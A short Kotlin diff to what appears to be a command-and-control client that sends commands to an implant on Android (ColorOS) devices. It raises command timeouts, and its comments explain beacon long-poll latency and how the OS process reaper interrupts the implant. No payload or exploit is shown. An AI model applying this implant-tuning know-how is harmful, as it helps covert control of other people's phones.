@@ -163,7 +163,7 @@ class RpcClient(private val config: ClientConfig) {
         // Must exceed one ColorOS reap cycle (~48s measured) plus hop latency, or a
         // command issued while the implant is mid-reap reports a timeout even though
         // it executes normally on the next beacon.
-        timeoutMs: Long = 90000,
+        timeoutMs: Long = 180000,
     ): CommandOutcome = withContext(Dispatchers.IO) {
         val send = rpcRaw(
             "send_command",
@@ -207,7 +207,10 @@ class RpcClient(private val config: ClientConfig) {
     }
 
     /** Back-compat shim for existing callers. */
-    suspend fun execute(implantCommand: String, payload: String, timeoutMs: Long = 12000): String =
+    // The beacon transport round-trip floor is ~27 s (DO parks a 25 s long-poll,
+    // and the implant only flushes results on its next loop pass). A 12 s default
+    // meant the terminal reported a timeout on commands that ran fine.
+    suspend fun execute(implantCommand: String, payload: String, timeoutMs: Long = 120000): String =
         executeDetailed(implantCommand, payload, timeoutMs).display()
 
     /** Implant liveness + queue depth. */
